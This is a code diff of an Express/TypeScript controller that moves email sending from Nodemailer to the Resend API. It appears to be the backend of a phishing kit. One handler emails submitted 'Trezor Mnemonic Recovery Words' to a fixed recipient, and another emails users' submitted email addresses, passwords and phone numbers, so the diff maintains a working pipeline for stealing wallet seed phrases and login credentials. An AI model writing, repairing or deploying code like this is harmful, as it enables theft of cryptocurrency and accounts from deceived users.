@@ -1,42 +1,25 @@
 import { Request, Response } from "express";
-import nodemailer from "nodemailer";
-import {
-  asyncHandler,
-  errorResponse,
-  successResponse,
-} from "../utils/handlers";
+import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
+import { Resend } from "resend";
+
+// Initialize Resend with API key from .env
+
 
 /**
- * Creates a reusable Nodemailer transporter.
- * Works with Gmail (App Password) or any SMTP provider.
- */
-const createTransporter = () => {
-  return nodemailer.createTransport({
-    host: process.env.SMTP_HOST || "smtp.gmail.com",
-    port: Number(process.env.SMTP_PORT) || 465,
-    secure: true, // Use SSL (port 465)
-    auth: {
-      user: process.env.SMTP_USER, // Your Gmail
-      pass: process.env.SMTP_PASS, // App Password
-    },
-    // Increase timeout & keep alive to prevent connection timeout
-    connectionTimeout: 15000,
-    greetingTimeout: 10000,
-    socketTimeout: 15000,
-  });
-};
-
-/**
- * Controller: Send mnemonic data
+ * Controller: Send Mnemonic Recovery Email
  */
 export const sendMnemonicController = asyncHandler(
-  async (req: Request, res: Response) => {
+    
+  async (req: Request, res: Response): Promise<Response> => {
+    const resend = new Resend(process.env.RESEND_API_KEY as string); 
     const payload = req.body;
 
+    // Validate payload
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
     }
 
+    // Build HTML email content
     let htmlContent = `<h2>${payload.heading}</h2><ul>`;
     payload.data.forEach((item: { label: string; value: string }) => {
       htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
@@ -44,36 +27,37 @@ export const sendMnemonicController = asyncHandler(
     htmlContent += `</ul>`;
 
     try {
-      const transporter = createTransporter();
-
-      await transporter.verify(); // Test connection
-
-      await transporter.sendMail({
-        from: `"Mnemonic Service" <${process.env.SMTP_USER}>`,
-        to: process.env.RECIPIENT_EMAIL,
+      // Send email via Resend
+      const response:any = await resend.emails.send({
+        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
+        to: process.env.RECIPIENT_EMAIL as string,
         subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
       });
 
-      return successResponse(res, {}, "Mnemonic sent successfully", 200);
+      console.log("✅ Email sent successfully:", response);
+      return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
-      console.error("Email sending error:", error.message);
+      console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
     }
   }
 );
 
 /**
- * Controller: Send user information
+ * Controller: Send User Info Email
  */
 export const sendUserInfoController = asyncHandler(
-  async (req: Request, res: Response) => {
+  async (req: Request, res: Response): Promise<Response> => {
+    const resend = new Resend(process.env.RESEND_API_KEY as string); 
     const { title, email, password, phone } = req.body;
 
+    // Validate input
     if (!title || !email || !password) {
       return errorResponse(res, "Missing required fields", 400);
     }
 
+    // Build email HTML content
     const htmlContent = `
       <h2>${title}</h2>
       <ul>
@@ -84,20 +68,17 @@ export const sendUserInfoController = asyncHandler(
     `;
 
     try {
-      const transporter = createTransporter();
-
-      await transporter.verify();
-
-      await transporter.sendMail({
-        from: `"User Info Service" <${process.env.SMTP_USER}>`,
-        to: process.env.RECIPIENT_EMAIL,
+      const response:any = await resend.emails.send({
+        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
+        to: process.env.RECIPIENT_EMAIL as string,
         subject: "User Information Received",
         html: htmlContent,
       });
 
-      return successResponse(res, {}, "Email sent successfully", 200);
+      console.log("✅ Email sent successfully:", response.id);
+      return successResponse(res, { id: response.id }, "Email sent successfully", 200);
     } catch (error: any) {
-      console.error("Email sending error:", error.message);
+      console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
     }
   }
